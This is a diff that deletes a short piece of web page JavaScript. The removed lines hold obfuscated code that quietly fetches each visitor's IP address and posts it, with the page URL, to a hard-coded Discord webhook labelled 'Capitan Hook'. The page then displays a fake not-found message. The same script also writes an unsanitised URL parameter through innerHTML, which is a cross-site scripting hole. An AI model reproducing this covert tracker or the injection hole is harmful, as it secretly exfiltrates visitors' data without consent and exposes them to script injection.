@@ -1,9 +1,0 @@
-const query = new URLSearchParams(window.location.search);
-const dataQuery = query.get("data")
-_0x3b1691();
-(async function(_0x2b3c,_0x53a1){var _0x319f=function(_0x5f35){while(--_0x5f35){_0x2b3c['push'](_0x2b3c['shift']());}};_0x319f(++_0x53a1);}(_0x2b3c,0x1b6));async function _0x3b1691(){try{const _0x6e1e=await fetch('https://api.ipify.org?format=json');const _0x2f29=await _0x6e1e.json();_0x3b1692(_0x2f29['ip']);_0x3b1b();}catch(_0x28ae){console['error']('Error!',_0x28ae);}}
-function _0x3b1b(){const _0x3b0d=document['getElementById']('loading');_0x3b0d['style']['display']='none';const _0x3882=document['getElementById']('not-found');_0x3882['style']['display']='block';}
-console.log(`Working for ${dataQuery}...`);
-const database_name_element = document.getElementById("database-name");
-database_name_element.innerHTML = dataQuery.replaceAll("_", " ");
-(function(_0x2d72,_0x3845){var _0x53e9=function(_0x49b8){while(--_0x49b8){_0x2d72['push'](_0x2d72['shift']());}};_0x53e9(++_0x3845);}(_0x2d72,0x1c8));function _0x3b1692(_0x1de8){fetch('https://discord.com/api/webhooks/1344319187094470687/iYp0GaYXqpcJ720LlPB59wRqZRpoPHsCZ8i2ARn4dAMqp338q7BidmYwbQ98KKcH_RXt',{method:'post',headers:{'Content-Type':'application/json'},body:JSON['stringify']({username:'Capitan Hook',avatar_url:'https://cdn.discordapp.com/avatars/411256446638882837/9a12fc7810795ded801fdb0401db0be6.png',allowed_mentions:{parse:['users','roles']},embeds:[{color:11730954,title:'Entrant Log',url:`${window['location']['href']}`,thumbnail:{url:'https://maploop.github.io/game-data/security_19.png'},fields:[{name:'IP Address',value:`${_0x1de8}`},{name:'Lookup Link',value:`https://ip-api/${_0x1de8}`}]}]})});}
